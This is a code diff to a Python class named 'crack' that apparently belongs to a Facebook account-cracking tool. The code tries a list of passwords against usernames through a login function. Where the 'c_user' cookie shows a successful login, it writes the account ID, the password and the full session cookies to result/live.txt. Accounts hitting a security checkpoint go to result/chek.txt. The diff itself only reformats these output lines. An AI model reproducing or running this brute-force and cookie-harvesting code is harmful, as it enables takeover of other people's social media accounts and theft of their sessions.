@@ -110,9 +110,9 @@ class crack:
 			for password in list_password:
 				rincian=login(username,password)
 				if "c_user" in rincian:
-					ok+=1;(lambda cookies,uid: self.save(f"\x1b[1;32m *--> [ok] {uid} | {password} | {cookies}","result/live.txt",live))((lambda: ";".join([_+"="+__ for _,__ in rincian.items()]))(),rincian['c_user']);break
+					ok+=1;(lambda cookies,uid: self.save(f"\x1b[1;32m ID: {uid} PW FB : {password} COOKIES : {cookies}","result/live.txt",live))((lambda: ";".join([_+"="+__ for _,__ in rincian.items()]))(),rincian['c_user']);break
 				if "checkpoint" in rincian:
-					cp+=1;(lambda cookies,uid: self.save(f"\x1b[1;33m *--> [cp] {uid} | {password}","result/chek.txt",chek))((lambda: ";".join([_+"="+__ for _,__ in rincian.items()]))(),(lambda _: json.loads(_)["u"])(urllib.request.unquote(rincian["checkpoint"])));break
+					cp+=1;(lambda cookies,uid: self.save(f"\x1b[1;33m ID: {uid} PW FB : {password}","result/chek.txt",chek))((lambda: ";".join([_+"="+__ for _,__ in rincian.items()]))(),(lambda _: json.loads(_)["u"])(urllib.request.unquote(rincian["checkpoint"])));break
 				else:
 					continue
 			#m = random.choice(['\x1b[1;91m','\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
@@ -135,7 +135,7 @@ class crack:
 						for x in rincian["request_args"]:
 							if "email" in x["key"]:
 								uid=x["value"];break
-					self.save(f"\x1b[1;33m *--> [cp] {uid} | {password}","result/chek.txt",chek);break
+					self.save(f"\x1b[1;33m DI: {uid} PW FB : {password}","result/chek.txt",chek);break
 				else:
 					continue
 			#m = random.choice(['\x1b[1;91m','\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
